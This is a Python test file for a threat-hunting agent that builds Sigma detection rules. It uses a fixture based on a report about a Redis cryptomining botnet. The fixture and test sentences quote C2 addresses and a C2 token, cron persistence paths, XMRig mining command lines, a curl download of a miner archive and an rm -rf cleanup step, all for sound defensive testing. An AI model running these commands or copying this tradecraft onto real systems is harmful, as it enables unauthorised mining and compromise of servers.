"""Defects the Redis cryptomining botnet gold case found (hunt.io, an exposed operator directory).

The report describes Linux servers compromised with no user involved, and most
of its text is about the operator's own Windows machine and toolkit. The first
replay scored 40/53: no server-side tradecraft in the technique catalog, a
token and a TLS fingerprint routed as file hashes, ports and cron paths that
never reached a rule, the article read twice, and the operator's own files
treated as files the malware writes.
"""

import json
from dataclasses import asdict
from typing import Any, Dict, List

import pytest
import yaml

from hecate_agent.agents.llm.sigma_generator import SigmaGenerationInput, SigmaGeneratorAgent, rule_filenames
from hecate_agent.core import source_evidence as se
from hecate_agent.core.platform_evidence import platform_evidence
from hecate_agent.core.provenance import IndicatorRecord, attach_text_ports, merge_records, placements, records_from_cti
from hecate_agent.core.query_literals import literals_from_artifacts
from hecate_agent.core.technique_evidence import map_behaviours, passage_status, sentence_status

TOKEN = "f90c8b1dcd374d4f552744ee1765583d"
PIN = "420c7850e09b7c2b9e39e2a93e204e3c56bcf08a685ff1daa986e3c348da5d2a"
C2 = "188.245.99.156"
URL = "https://report.example/redis"

#: The report's shape: inline elements and table cells each on their own line.
PAGE = f"""A rogue Redis server on ports 16379 through 16385 at
188.245[.]99.156
delivers the RDB blob, which the victim writes verbatim to /etc/cron.d/.redis-miner.
The cron job pulls XMRig and runs the hidden /tmp/.xmrig binary against
pool.moneroocean[.]stream
:443 over TLS.
A batch script, start_c2.bat, launches the operator's C2 server component directly:
set
C2_TOKEN={TOKEN}
start /B C:\\host_public\\python311\\python.exe -u c2_persist.py 10000 0.0.0.0
Copy
Compromised hosts check in over plain HTTP GETs of the form
http://<c2-host>:10000/ping?h=<hostname>
, a lightweight heartbeat.
The newest payload adds --tls-fingerprint={PIN}. That pins the pool certificate.
Two batch scripts run a locally staged copy of XMRig right on the operator's own host:
C:\\Users\\Public\\xmrig\\xmrig.exe -o 45.155.102.89:10128
Copy
The operator works from redis_fleet.txt, a target list sitting in the directory next to rogue.py.
Indicators of Compromise
188.245[.]99.156
:10000
IP:port
C2 callback endpoint
188.245[.]99.156
:16379--16385
IP:port range
Rogue Redis replication ports
47.250[.]92.230
IP
Most frequently reused QA/test target (ownership unconfirmed)
34.166[.]99.116
,
213.6[.]207.123
IP
Additional observed dev/QA targets, ownership unconfirmed
194.48.248[.]105
:8081
IP:port
Earlier (Feb 2026), separate open directory linked by wallet reuse
{PIN}
TLS fingerprint
Pinned pool certificate, most recent payload variant only
/etc/cron.hourly/redis-miner
Fallback cron persistence path
"""


def _artifact(value: str, kind: str, **extra: Any) -> Dict[str, Any]:
    return {"value": value, "kind": kind, "role": "unknown", "status": "active", "evidence": "", **extra}


def _extract(*artifacts: Dict[str, Any]) -> se.SourceEvidence:
    return se.extract_source_evidence(URL, page_text=PAGE, complete=lambda _: json.dumps({"artifacts": list(artifacts)}))


def _no_reply(_: List[Dict[str, str]]) -> str:
    return json.dumps({"artifacts": []})


# --- The page ---------------------------------------------------------------------------------


def test_a_second_copy_of_the_article_is_removed() -> None:
    paragraphs = [
        f"Paragraph {n} of the article, long enough to be a line of prose and not a heading. " * 3 for n in range(12)
    ]
    body = "\n".join(["TABLE OF CONTENTS", "Key Findings", *paragraphs, "Conclusion"])
    page = f"Nav\nBlog\n{body}\n{body}\nFooter"
    assert se.strip_repeated_body(page) == f"Nav\nBlog\n{body}\nFooter"


def test_repeated_short_lines_are_not_a_second_copy() -> None:
    page = (
        "IP\nRole\n"
        + "A sentence that appears twice in a report, as a pull quote does, and is longer than a heading.\n" * 2
        + "IP\nRole"
    )
    assert se.strip_repeated_body(page) == page


def test_a_related_posts_heading_split_across_lines_ends_the_article() -> None:
    page = "The article body. " * 40 + "\nRelated\nPosts\nAnother campaign that used PowerShell on Windows."
    assert "PowerShell" not in se.strip_page_furniture(page)


# --- Values that are not indicators -----------------------------------------------------------


def test_a_token_and_a_certificate_fingerprint_are_not_file_hashes() -> None:
    assert se.non_file_passage(PAGE, TOKEN) == f"C2_TOKEN={TOKEN}"
    assert se.non_file_passage(PAGE, PIN) == f"--tls-fingerprint={PIN}"
    assert se.non_file_passage(f"{PIN}\nTLS fingerprint\nPinned pool certificate", PIN) == f"{PIN} TLS fingerprint"
    assert se.non_file_passage(f"Go loader SHA-256 {PIN}", PIN) == ""


def test_feed_hashes_the_report_shows_are_a_token_and_a_fingerprint_get_no_rule() -> None:
    evidence = _extract(_artifact(TOKEN, "md5", role="executable", evidence="launches the operator's C2 server component"))
    records = se.build_indicator_records({"FileHash-MD5": [TOKEN], "FileHash-SHA256": [PIN]}, evidence, _no_reply)
    hashes = {r.value: r for r in records if r.type in ("md5", "sha256")}
    assert {r.role for r in hashes.values()} == {"non_file"}
    assert [placements(r) for r in hashes.values()] == [[], []]
    assert hashes[TOKEN].evidence == f"C2_TOKEN={TOKEN}" and hashes[PIN].source == URL


def test_a_template_url_and_a_bind_address_are_dropped() -> None:
    evidence = _extract(
        _artifact("http://<c2-host>:10000/ping?h=<hostname>", "url", role="c2"),
        _artifact("0.0.0.0", "ipv4", role="c2"),
        _artifact(C2, "ipv4", role="c2"),
    )
    assert [r.value for r in evidence.indicators] == [C2]
    assert any("not a well-formed url" in d for d in evidence.dropped)
    assert any("0.0.0.0: not a routable address" in d for d in evidence.dropped)


# --- Ports ------------------------------------------------------------------------------------


def test_ports_written_beside_an_address_scope_its_rule() -> None:
    records = [IndicatorRecord(C2, "ipv4", role="c2", status="active"), IndicatorRecord("pool.moneroocean.stream", "domain")]
    attach_text_ports(records, PAGE)
    assert records[0].ports == [10000, *range(16379, 16386)]
    assert records[1].ports == [443]


@pytest.mark.parametrize(
    ("text", "ports"),
    [
        ("outbound HTTP to 188.245.99.156 on port 10000", [10000]),
        ("We found it on port 80 at 188.245.99.156 and pulled the files", [80]),
        ("scanned 188.245.99.156:1024-65535", []),  # a scan range, not service ports
        ("188.245.99.156: 147 files were recovered", []),  # a count, not a port
        ("connects to 8.188.245.99.156:9000", []),  # a different, longer value
    ],
)
def test_port_wording(text: str, ports: List[int]) -> None:
    record = IndicatorRecord(C2, "ipv4")
    attach_text_ports([record], text)
    assert record.ports == ports


def test_a_hostnames_port_is_not_given_to_its_parent_domain() -> None:
    records = [IndicatorRecord("ayakliborsa.net", "domain"), IndicatorRecord("socket.ayakliborsa.net", "hostname")]
    attach_text_ports(records, "socket.ayakliborsa[.]net:8081 served the directory")
    assert [r.ports for r in records] == [[], [8081]]


def test_one_name_listed_as_domain_and_hostname_is_one_record() -> None:
    feed = records_from_cti({"hostname": ["socket.ayakliborsa.net"]})
    merged = merge_records(
        feed, [IndicatorRecord("socket.ayakliborsa.net", "domain", role="c2", status="active", evidence="x")]
    )
    assert [(r.type, r.role) for r in merged] == [("hostname", "c2")]


# --- Addresses the actor aimed at, or used elsewhere ------------------------------------------


@pytest.mark.parametrize(
    ("value", "role"),
    [
        ("47.250.92.230", "target"),
        ("34.166.99.116", "target"),  # shares a role cell with the address after it
        ("213.6.207.123", "target"),
        ("194.48.248.105", "historical"),  # a separate, earlier operation
        (C2, ""),  # "C2 callback endpoint": a role victims would see always wins
    ],
)
def test_the_reports_own_words_fix_an_address_role(value: str, role: str) -> None:
    assert se.network_role_from_context(PAGE, value)[0] == role


def test_target_and_other_operation_addresses_get_no_rule_whatever_the_model_said() -> None:
    evidence = _extract(
        _artifact("47.250.92.230", "ipv4", role="c2", evidence="Most frequently reused QA/test target"),
        _artifact("194.48.248.105:8081", "ipv4", role="c2", evidence="separate open directory linked by wallet reuse"),
        _artifact(C2, "ipv4", role="c2", evidence="C2 callback endpoint"),
    )
    records = {r.value: r for r in se.build_indicator_records({"IPv4": ["213.6.207.123"]}, evidence, _no_reply)}
    assert {v: (r.role, r.ports) for v, r in records.items() if not placements(r)} == {
        "47.250.92.230": ("target", []),
        "194.48.248.105": ("historical", []),
        "213.6.207.123": ("target", []),
    }
    assert placements(records[C2]) == ["network_connection.DestinationIp"] and 10000 in records[C2].ports


# --- Persistence files ------------------------------------------------------------------------


def test_files_under_persistence_directories_are_found_without_the_model() -> None:
    found = {a.value: a for a in se.persistence_file_artifacts(PAGE)}
    assert set(found) == {"/etc/cron.d/.redis-miner", "/etc/cron.hourly/redis-miner"}
    assert all(a.kind == "file_path" and a.status == "active" for a in found.values())
    assert "writes verbatim" in found["/etc/cron.d/.redis-miner"].evidence


def test_a_directory_alone_or_an_unobserved_path_is_not_a_persistence_file() -> None:
    text = (
        "Audit /etc/cron.d/ and /var/spool/cron/crontabs for entries. The tool can also write /etc/cron.d/backdoor on request."
    )
    assert se.persistence_file_artifacts(text) == []


def test_persistence_files_become_written_file_rules() -> None:
    evidence = _extract()
    agent = SigmaGeneratorAgent.__new__(SigmaGeneratorAgent)
    built = agent._written_file_rules(
        SigmaGenerationInput(
            hunt_id="H-0001",
            hypothesis="Redis rogue replication writes a cron entry.",
            justification="",
            techniques=["T1053.003"],
            platforms=["Linux"],
            source_artifacts=[asdict(a) for a in evidence.artifacts],
        )
    )
    targets = [yaml.safe_load(rule.rule_yaml)["detection"]["selection"] for rule, _ in built if rule]
    assert {"TargetFilename": "/etc/cron.d/.redis-miner"} in targets


def test_rules_for_files_with_the_same_name_each_get_their_own_file() -> None:
    agent = SigmaGeneratorAgent.__new__(SigmaGeneratorAgent)
    paths = ["/etc/cron.d/.redis-miner", "/etc/cron.d/redis-miner", "/etc/cron.hourly/redis-miner", "/tmp/.xmrig"]
    built = agent._written_file_rules(
        SigmaGenerationInput(
            hunt_id="H-0001",
            hypothesis="Redis rogue replication writes a cron entry.",
            justification="",
            techniques=["T1053.003"],
            platforms=["Linux"],
            source_artifacts=[_artifact(p, "file_path", role="persistence file", evidence=f"writes {p}") for p in paths],
        )
    )
    names = rule_filenames([rule for rule, _ in built if rule])
    assert len(names) == len(set(names)) == 4
    assert names[1] == names[0][:-4] + "_2.yml" and names[2] == names[0][:-4] + "_3.yml"


# --- Server-side tradecraft -------------------------------------------------------------------


@pytest.mark.parametrize(
    ("sentence", "technique"),
    [
        ("The operation exploited unauthenticated Redis instances using rogue replication.", "T1190"),
        ("The tooling issues SLAVEOF and the victim accepts a crafted RDB blob from the rogue master.", "T1190"),
        ("The cron job deployed XMRig miners on every victim.", "T1496"),
        ("The miner gets renamed to a dot-prefixed hidden file (/tmp/.xmrig).", "T1564.001"),
        ("The same cron job pings c2_persist.py with a plain HTTP GET.", "T1071.001"),
        ("Compromised hosts check in over plain unauthenticated HTTP GETs.", "T1071.001"),
        ("Watch for outbound HTTP to 188.245.99.156 on port 10000 (the C2 check-in).", "T1571"),
        ("188.245.99.156:10000 is the C2 callback endpoint.", "T1571"),
        ("The payload runs rm -rf /tmp/x.tgz /tmp/xmrig-* once the miner is in place.", "T1070.004"),
        (
            "The payload runs curl -sLk 'https://github.com/xmrig/xmrig/releases/download/v6.22.2/x.tar.gz' -o /tmp/x.tgz",
            "T1105",
        ),
    ],
)
def test_server_side_behaviour_maps_to_its_technique(sentence: str, technique: str) -> None:
    assert technique in {e.technique_id for e in map_behaviours([("primary source", sentence)]) if e.status == "observed"}


def test_c2_on_a_standard_port_is_not_a_non_standard_port() -> None:
    found = map_behaviours([("primary source", "The implant's C2 check-in goes to 203.0.113.9 on port 443.")])
    assert "T1571" not in {e.technique_id for e in found}


# --- The actor's own side ---------------------------------------------------------------------


@pytest.mark.parametrize(
    "sentence",
    [
        "An exposed directory revealed a cryptomining toolkit including Windows registry hives.",
        "The operator runs local cryptomining on their own host using the same wallet.",
        "We pulled 147 files: Python exploit source, campaign-result logs and two exported Windows registry hives.",
        "There are two obfuscation techniques in the toolkit, both narrow.",
        "47.250.92.230 is the most-reused QA target, hardcoded across deploy_all.py.",
    ],
)
def test_a_sentence_about_the_actors_own_machine_or_toolkit_is_context(sentence: str) -> None:
    assert sentence_status(sentence) == "context"


def test_a_sentence_that_also_says_what_happened_on_a_victim_stays_evidence() -> None:
    sentence = "The operator's own server delivers the RDB blob into a victim's cron.d entry."
    assert sentence_status(sentence) == "observed"


def test_a_quoted_block_takes_the_side_of_the_clause_that_introduces_it() -> None:
    lead = "Padding sentence without a full stop so the segment runs on " * 6
    segment = (
        f"{lead} two batch scripts run a locally staged copy of XMRig right on the operator's own host: "
        'cd /d "C:\\Users\\Public\\xmrig" C:\\Users\\Public\\xmrig\\xmrig.exe -o 45.155.102.89:10128 -t 4 --keepalive '
        + "--donate-level 0 " * 20
    )
    at = segment.index("xmrig.exe")
    assert passage_status(segment, at, at + 9)[0] == "context"


def test_the_operators_windows_machine_does_not_scope_the_hunt_to_windows() -> None:
    evidence = platform_evidence([PAGE + "\nVictims ran Linux: the ELF miner was started by crontab under systemd hosts."])
    assert evidence.supported == ["Linux"]


def test_an_artifact_on_the_actors_own_machine_is_untied_from_the_intrusion() -> None:
    evidence = _extract(
        _artifact("redis_fleet.txt", "file_path", role="target list", evidence="The operator works from redis_fleet.txt"),
        _artifact("xmrig.exe", "process", role="miner", evidence="two batch scripts run a locally staged copy of XMRig"),
        _artifact("/tmp/.xmrig", "file_path", role="hidden binary", evidence="runs the hidden /tmp/.xmrig binary"),
    )
    by_value = {a.value: a for a in evidence.artifacts}
    assert (by_value["redis_fleet.txt"].role, by_value["redis_fleet.txt"].status) == (se.ATTACKER_SIDE_ROLE, "unknown")
    assert by_value["xmrig.exe"].role == se.ATTACKER_SIDE_ROLE
    assert by_value["/tmp/.xmrig"].status == "active"
    literals = [lit.sigma for lit in literals_from_artifacts([asdict(a) for a in evidence.artifacts], ["Linux"])]
    assert "/tmp/.xmrig" in literals and not {"redis_fleet.txt", "\\xmrig.exe"} & set(literals)


def test_a_victim_side_path_in_a_capability_sentence_stays_tied_to_the_intrusion() -> None:
    page = "The malware supports persistence by deploying a payload at /Users/<redacted>/Library/Caches/x/SoftwareUpdate."
    evidence = se.extract_source_evidence(
        URL,
        page_text=page,
        complete=lambda _: json.dumps(
            {"artifacts": [_artifact("/Users/<redacted>/Library/Caches/x/SoftwareUpdate", "file_path", evidence=page)]}
        ),
    )
    assert [(a.role, a.status) for a in evidence.artifacts] == [("unknown", "active")]


# --- Literals a hunt's platforms can show -----------------------------------------------------


def test_values_no_covered_platform_can_show_are_not_offered_to_rules() -> None:
    artifacts = [
        _artifact("C:\\host_public\\python311\\c2_persist.py", "file_path"),
        _artifact("/tmp/.xmrig", "file_path"),
        _artifact("xmrig", "process"),
    ]
    assert [lit.sigma for lit in literals_from_artifacts(artifacts, ["Linux"])] == ["/tmp/.xmrig", "/xmrig"]
    assert [lit.sigma for lit in literals_from_artifacts(artifacts, ["Windows"])] == [
        "C:\\host_public\\python311\\c2_persist.py",
        "\\xmrig.exe",
    ]
    assert len(literals_from_artifacts(artifacts)) == 3  # platforms unknown: nothing is ruled out


def test_a_file_name_does_not_supply_its_own_write_verb() -> None:
    (lit,) = literals_from_artifacts([_artifact("SAM.save", "file_path", evidence="SAM.save checked out as a genuine hive")])
    assert not lit.written


def test_a_bare_file_name_gets_no_written_file_rule() -> None:
    """A file event needs a location: SAM.save and fleet.b64 were in the operator's own directory."""
    agent = SigmaGeneratorAgent.__new__(SigmaGeneratorAgent)
    built = agent._written_file_rules(
        SigmaGenerationInput(
            hunt_id="H-0001",
            hypothesis="The dropper writes its payload.",
            justification="",
            techniques=["T1105"],
            platforms=["Linux"],
            source_artifacts=[
                _artifact("kworkerd", "file_path", role="payload", evidence="The dropper writes kworkerd"),
                _artifact("/tmp/kworkerd", "file_path", role="payload", evidence="The dropper writes /tmp/kworkerd"),
            ],
        )
    )
    ((rule, _),) = built
    assert yaml.safe_load(rule.rule_yaml)["detection"]["selection"] == {"TargetFilename": "/tmp/kworkerd"}
